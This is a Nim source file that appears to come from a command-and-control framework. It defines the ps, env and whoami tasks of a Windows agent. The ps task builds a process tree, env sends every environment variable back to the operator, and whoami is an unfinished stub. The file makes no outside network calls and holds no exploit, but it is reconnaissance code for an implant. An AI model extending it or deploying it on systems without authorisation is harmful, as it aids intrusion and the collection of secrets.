import ../common/[types, utils]

# Declare function prototypes
proc executePs(config: AgentConfig, task: Task): TaskResult
proc executeEnv(config: AgentConfig, task: Task): TaskResult
proc executeWhoami(config: AgentConfig, task: Task): TaskResult

# Command definitions
let commands*: seq[Command] = @[
    Command(
        name: "ps",
        commandType: CMD_PS,
        description: "Display running processes.",
        example: "ps",
        arguments: @[],
        execute: executePs
    ),
    Command(
        name: "env",
        commandType: CMD_ENV,
        description: "Display environment variables.",
        example: "env",
        arguments: @[],
        execute: executeEnv
    ),
    Command(
        name: "whoami",
        commandType: CMD_WHOAMI,
        description: "Get user information.",
        example: "whoami",
        arguments: @[],
        execute: executeWhoami
    )
]

# Implement execution functions
when defined(server):
    proc executePs(config: AgentConfig, task: Task): TaskResult = nil
    proc executeEnv(config: AgentConfig, task: Task): TaskResult = nil
    proc executeWhoami(config: AgentConfig, task: Task): TaskResult = nil

when defined(agent): 

    import winim
    import os, strutils, sequtils, strformat, tables, algorithm
    import ../agent/core/taskresult

    # TODO: Add user context to process information
    type 
        ProcessInfo = object 
            pid: DWORD
            ppid: DWORD 
            name: string 
            children: seq[DWORD]

    proc executePs(config: AgentConfig, task: Task): TaskResult = 
        
        echo fmt"   [>] Listing running processes."
        
        try: 

            var processes: seq[DWORD] = @[]
            var procMap = initTable[DWORD, ProcessInfo]()
            var output: string = ""

            # Take a snapshot of running processes
            let hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
            if hSnapshot == INVALID_HANDLE_VALUE: 
                raise newException(CatchableError, "Invalid permissions.\n")
            
            # Close handle after object is no longer used
            defer: CloseHandle(hSnapshot)

            var pe32: PROCESSENTRY32
            pe32.dwSize = DWORD(sizeof(PROCESSENTRY32))

            # Loop over processes to fill the map            
            if Process32First(hSnapshot, addr pe32) == FALSE:
                raise newException(CatchableError, "Failed to get processes.\n")
            
            while true: 
                var procInfo = ProcessInfo(
                    pid: pe32.th32ProcessID,
                    ppid: pe32.th32ParentProcessID,
                    name: $cast[WideCString](addr pe32.szExeFile[0]),
                    children: @[]
                )
                
                procMap[pe32.th32ProcessID] = procInfo

                if Process32Next(hSnapshot, addr pe32) == FALSE: 
                    break 

            # Build child-parent relationship
            for pid, procInfo in procMap.mpairs():
                if procMap.contains(procInfo.ppid):
                    procMap[procInfo.ppid].children.add(pid)
                else: 
                    processes.add(pid)

            # Format and print process
            proc printProcess(pid: DWORD, indentSpaces: int = 0) = 
                if not procMap.contains(pid): 
                    return
                
                var process = procMap[pid]
                let indent = " ".repeat(indentSpaces) 

                let tree = (indent & fmt"[{process.pid}]").alignLeft(30)

                output &= fmt"{tree}{process.name:<25}" & "\n"

                # Recursively print child processes with indentation
                process.children.sort()
                for childPid in process.children:
                    printProcess(childPid, indentSpaces + 2)

            # Iterate over root processes
            processes.sort()
            for pid in processes: 
                printProcess(pid)

            return createTaskResult(task, STATUS_COMPLETED, RESULT_STRING, output.toBytes())

        except CatchableError as err: 
            return createTaskResult(task, STATUS_FAILED, RESULT_STRING, err.msg.toBytes())

    proc executeEnv(config: AgentConfig, task: Task): TaskResult = 

        echo fmt"   [>] Displaying environment variables."

        try: 
            var envVars: string = ""
            for key, value in envPairs(): 
                envVars &= fmt"{key}: {value}" & '\n'
            return createTaskResult(task, STATUS_COMPLETED, RESULT_STRING, envVars.toBytes())

        except CatchableError as err: 
            return createTaskResult(task, STATUS_FAILED, RESULT_STRING, err.msg.toBytes())

    proc executeWhoami(config: AgentConfig, task: Task): TaskResult = 

        echo fmt"   [>] Getting user information."

        try: 
            echo "whoami"


        except CatchableError as err: 
            return createTaskResult(task, STATUS_FAILED, RESULT_STRING, err.msg.toBytes())